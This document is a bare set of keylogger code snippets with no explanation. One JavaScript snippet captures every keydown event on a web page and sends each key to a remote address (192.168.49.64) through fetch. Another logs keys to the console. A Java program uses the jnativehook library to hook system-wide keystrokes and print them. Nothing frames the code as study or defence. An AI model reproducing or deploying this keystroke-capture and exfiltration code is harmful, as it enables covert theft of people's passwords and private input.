

function logkey(event){
    fetch(
        "http://192.168.49.64/thing?key=" + event.key);
}

////
////

document.addEventListener('keydown',logkey);

////

function logkey(event){
    console.log(event.key)
}

////
////

document.addEventListener('keydown',logkey);

////
////

package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener{

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Main());
    }


    public void nativeKeyPressed(NativeKeyEvent e) {
       System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

    }

    public void nativeKeyReleased(NativeKeyEvent e) {
       System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void nativeKeyTyped(NativeKeyEvent arg0) {   
    }
}

////
////

